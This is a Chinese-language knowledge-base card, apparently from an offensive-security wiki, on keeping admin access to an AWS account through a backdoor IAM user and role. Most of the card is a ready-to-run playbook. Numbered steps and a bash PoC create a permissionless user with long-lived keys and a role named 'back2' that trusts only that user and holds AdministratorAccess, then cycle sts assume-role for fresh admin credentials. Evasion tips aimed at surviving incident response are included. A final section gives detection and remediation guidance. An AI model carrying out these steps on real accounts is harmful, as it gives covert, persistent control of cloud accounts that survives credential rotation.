---
id: cloud-cloud-iam-aws-backdoor-role-assume-role-persistence
title: AWS 后门角色持久化：新建角色 trust 策略只信任后门用户 + 附加 AdministratorAccess，用后门用户的长期 AK 反复 sts assume-role 换管理员临时凭证
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: aws-backdoor-role-assume-role-persistence
tags:
- cloud
- aws
- iam
- sts
- assume-role
- persistence
- backdoor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:50:27+08:00'
  notes: 已对照原文核对 create-user normal、AssumeRole trust policy JSON(Principal=该用户 ARN、Action=sts:AssumeRole、Condition 空)、create-role back2 --assume-role-policy-document、attach-role-policy AdministratorAccess、sts assume-role --role-session-name 与返回 Credentials 结构、以及临时凭证有 Expiration 的缺点均与原文一致；未验证点：MaxSessionDuration 默认 1 小时/最大 12 小时、roleSessionName 检测特征、跨账号复核等属作者补充推理，原文只给标准跨账号写法示意。
url: /docs/cloud/cloud-iam/cloud-cloud-iam-aws-backdoor-role-assume-role-persistence/
draft: false
kb_aliases:
- AssumeRole 后门
- 后门角色会话
- sts:AssumeRole 持久化
- trust policy 只信任后门用户
- 双身份后门 users+role
- role-session-name 后门
---

## 一句话结论

比「直接留一把管理员 AK」更隐蔽的持久化是把权限拆成两段：新建一个**无权限**的普通用户（长期 AK 作为「低价值」凭据保存），再新建一个角色，其 trust policy 写成只信任该用户 `sts:AssumeRole`，并给角色挂 `AdministratorAccess`；之后用普通用户的 AK 执行 `aws sts assume-role` 换取角色的临时管理员凭证即可操作，临时凭证过期就再换一次——即便防守方发现并轮换了场景中使用的管理员凭据，这对「用户 + 角色」只要没被同时清掉就仍然可用。

## 原理

- **身份与权限分离**：IAM 用户承载长期凭证（AK/SK 永不过期），IAM 角色承载权限但不持有长期凭证，只能通过 `sts:AssumeRole` 换取带 `SessionToken` 的临时凭证（有 `Expiration`）。把「长期凭据」放在低权限用户上、把「管理员权限」放在角色上，是 AWS 持久化的常见结构。
- **谁可以扮演角色由 trust policy 决定**：角色的 `AssumeRolePolicyDocument` 就是它的信任策略。写成 `Principal: {"AWS": "arn:aws:iam::<acct>:user/normal"}` + `Action: "sts:AssumeRole"` 后，只有这个用户能扮演它；如果写成整账号 root 或通配，则任何有 `sts:AssumeRole` 的身份都能扮演，隐蔽性下降。
- **为什么选「无权限的后门用户」**：`create-user` 后不附加任何策略的角色，该用户在 IAM 审计里看起来是「空壳用户」，比「用户直接持有 AdministratorAccess」更不显眼；但它能作为角色扮演的入口，一旦配上角色就等价于管理员。
- **为什么角色比用户更耐清理**：「用户泄露」是应急响应的第一检查项（`list-users`、`list-access-keys`），而角色通常不在同一个检查清单里；审计若只看「谁有 AdministratorAccess」仍会看到角色，但若只看 user 侧则漏掉。
- **临时凭证的代价与收益**：临时凭证最长 12 小时（`DurationSeconds` 上限由角色 `MaxSessionDuration` 决定），攻击者必须周期性重新 assume；收益是即便某一份临时凭证被 CloudTrail 抓到并加入黑名单，只要用户+角色还在，就能立刻生成新的。
- **`--role-session-name` 是弱标识**：session name 会出现在 CloudTrail 的 `roleSessionName` 与 assumed-role ARN 里（`arn:aws:sts::<acct>:assumed-role/<role>/<session>`）；用固定名（如 `<role>-session`）便于攻击者自己识别，但也给了防守方一个稳定的检测特征。
- **跨账号同理**：trust policy 的 Principal 可以是另一个账号的 ARN，于是「Account A 的后门用户 → 扮演 Account B 的角色」构成跨账号后门，这也是标准 `aws sts assume-role --role-arn ... --role-session-name ...` 用法。
- 边界：角色需要 `MaxSessionDuration` 足够长（默认 1 小时，最大 12 小时）；若组织用 SCP 限制 `sts:AssumeRole` 或限制角色权限上限，则角色可能拿不到管理员；信任策略里 Principal 写错账号/用户 ARN 会导致 `AccessDenied`。

## 触发条件

- 攻击者持有可 `iam:CreateUser`、`iam:CreateRole`、`iam:AttachRolePolicy`、`iam:CreateAccessKey`、`iam:UpdateAssumeRolePolicy` 的高权限凭据。
- 目标账号允许创建角色并附加 AWS 托管策略；未通过 SCP 禁止「角色获得管理员权限」。
- 攻击者能保存后门用户的长期 AK/SK。
- 攻击者需要周期性执行 `sts:AssumeRole`（临时凭证过期后重新换）。

## 利用步骤

1. 建后门用户（不挂任何策略，保持「空壳」）：`aws iam create-user --user-name normal`；再 `aws iam create-access-key --user-name normal` 保存 AK/SK。
2. 写 trust policy 文件，只信任该用户：
   ```json
   {"Version":"2012-10-17","Statement":[{"Effect":"Allow",
     "Principal":{"AWS":"arn:aws:iam::<acct>:user/normal"},
     "Action":"sts:AssumeRole","Condition":{}}]}
   ```
3. 建角色并绑定信任策略：`aws iam create-role --role-name back2 --assume-role-policy-document file:///root/1.json`；确认返回里的 `AssumeRolePolicyDocument` 就是上面这份。
4. 给角色挂管理员：`aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name back2`。
5. 用后门用户凭据换取临时管理员凭证：`aws sts assume-role --role-arn arn:aws:iam::<acct>:role/back2 --role-session-name back2-session --profile <后门用户 profile>`，拿到 `Credentials.AccessKeyId/SecretAccessKey/SessionToken/Expiration`。
6. 把这三项作为环境变量/新 profile 使用，`aws sts get-caller-identity` 应显示 `arn:aws:sts::<acct>:assumed-role/back2/back2-session`。
7. 临时凭证过期（看 `Expiration`）后重复第 5 步；不要在本地长期保存临时凭证。

## PoC

```bash
# 1) 后门用户：只留长期 AK，不给任何权限
aws iam create-user --user-name normal
aws iam create-access-key --user-name normal

# 2) trust policy 只信任这个用户（1.json）
cat > /root/1.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow",
 "Principal":{"AWS":"arn:aws:iam::<acct>:user/normal"},
 "Action":"sts:AssumeRole","Condition":{}}]}
EOF

# 3) 建角色 + 附管理员策略
aws iam create-role --role-name back2 --assume-role-policy-document file:///root/1.json
aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name back2

# 4) 用后门用户换临时管理员凭证（过期重换）
aws sts assume-role \
  --role-arn arn:aws:iam::<acct>:role/back2 \
  --role-session-name back2-session \
  --profile backdoor
# => {"Credentials":{"AccessKeyId":"ASIA...","SecretAccessKey":"...","SessionToken":"...","Expiration":"..."}}

# 5) 使用临时凭证
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity   # arn:aws:sts::<acct>:assumed-role/back2/back2-session
```

## 变体与关联

- 变体：`Condition` 里加 `aws:SourceIp`/`aws:PrincipalArn`/`sts:ExternalId` 反而会限制攻击者自己，通常留空（原文即为 `"Condition":{}`）。
- 变体：trust policy 允许整账号（`arn:aws:iam::<acct>:root`）时任何能 `sts:AssumeRole` 的身份都可扮演，隐蔽性更差但复用面更广。
- 变体：把角色挂在可被服务使用的路径上（如 `ec2`/`lambda` 服务角色），配合 `PassRole` 让实例/函数自动以角色身份运行，等于「不需要自己 assume」的后门（见关联卡）。
- 变体：跨账号结构——Account A 的后门用户扮演 Account B 的角色，`--role-session-name cross-account-session`（原文给出的标准写法）。
- 关联：[[cloud-cloud-iam-aws-backdoor-user-key-persistence]]（用户侧持久化；本条把「权限」搬进角色以降低 user 侧显眼度）、[[cloud-cloud-iam-aws-dangerous-permission-privesc]]（`iam:PassRole`/`AttachUserPolicy` 的提权视角）、[[cloud-cloud-iam-sts-policy-injection-object-key]]（AssumeRole 时注入 Session Policy 的另一类越权）、[[cloud-cloud-iam-workload-role-policy-selfcheck]]（先确认是否具备建角色/换角色的动作）。
- 边界：角色 `MaxSessionDuration` 默认 1 小时，需要长时间驻留时要改长或频繁重换；SCP/permissions boundary 会把角色权限截断；trust policy 写错 Principal 立即 `AccessDenied`。

## 检测与防御

- 检测：CloudTrail 关联 `CreateRole` + `AttachRolePolicy`（尤其附加 `AdministratorAccess`）+ `UpdateAssumeRolePolicy` 三个事件；关注「新建角色后 trust policy 只信任某个新建用户」的组合。
- 检测：`AssumeRole` 事件的 `roleSessionName` 固定复用（如始终 `back2-session`）、来源 IP/ASN 与角色正常使用者不符、以及同一角色被同一用户在短时间内反复 assume（临时凭证到期后立刻重换）的模式。
- 检测：assumed-role ARN 出现在非预期操作（如 IAM 变更、S3 大批量下载）中；角色 `MaxSessionDuration` 被改大也是信号。
- 防御：禁止普通身份持有 `iam:CreateRole`/`AttachRolePolicy`/`UpdateAssumeRolePolicy` 组合；对「角色可附加 AdministratorAccess」加 SCP 限制或加 `iam:PermissionsBoundary`。
- 防御：对角色 trust policy 变更做审批与告警；定期巡检「trust policy 只信任单个非基线用户」的角色；限制 `MaxSessionDuration`，并对 `AssumeRole` 设置来源条件。
- 应急：先 `update-assume-role-policy` 把后门用户从信任策略移除（立即切断换取能力），再 `detach-role-policy`、最后按需 `delete-role`；同时审查该角色与后门用户的全部 CloudTrail 历史。
